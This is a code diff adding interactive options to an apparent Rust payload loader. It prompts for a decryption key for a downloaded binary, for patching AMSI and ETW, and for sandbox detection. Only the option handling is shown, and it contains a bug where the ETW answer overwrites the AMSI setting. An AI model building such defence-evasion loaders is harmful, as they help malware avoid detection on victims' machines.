@@ -67,9 +67,53 @@ fn interactive_mode_setup(cmd_line: &mut user_struct::CmdOptions) -> Result <(),
         eprintln!("[!] URL value cannot be empty!");
     }
 
-
     // Check for encryption
     cmd_line.enc = get_choice("Is the incoming binary encrypted?(y/N): ");
+
+    // Get Key for Encryption
+    if cmd_line.enc {
+        loop {
+            let _key = match get_user_input("Enter Decryption Key: ") {
+                Some(val) => val.to_string(),
+                None => return Err("Failed to read decryption key!".into()),
+            };
+    
+            if  !_key.is_empty() {
+                cmd_line.key = Some(_key);
+                break;
+            }
+            eprintln!("[!] Key value cannot be empty!");
+        }
+    }
+
+    // Patching and Detection
+    cmd_line.patch_amsi = get_choice("Patch AMSI?(y/N): ");
+    cmd_line.patch_amsi = get_choice("Patch ETW?(y/N): ");
+    cmd_line.detect_sandbox = get_choice("Detect Sandbox?(y/N): ");
+
+    // Get printing mode
+    let printing_mode = get_user_input("Printing mode([n]ormal/[Q]uiet/[V]erbose):");
+    match printing_mode.unwrap().as_str().chars().next(){
+        Some(_v) => {
+            let ch = _v.to_ascii_uppercase();
+            if ch == 'V' {
+                cmd_line.verbose = true;
+                cmd_line.quiet = false;
+            }
+            else if ch == 'Q'{
+                cmd_line.verbose = false;
+                cmd_line.quiet = true;
+            }
+            else {
+                cmd_line.verbose = false;
+                cmd_line.quiet = false;
+            }
+        },
+        None => {
+            cmd_line.verbose = false;
+            cmd_line.quiet = false;
+        }
+    };
 
     Ok(())
 }
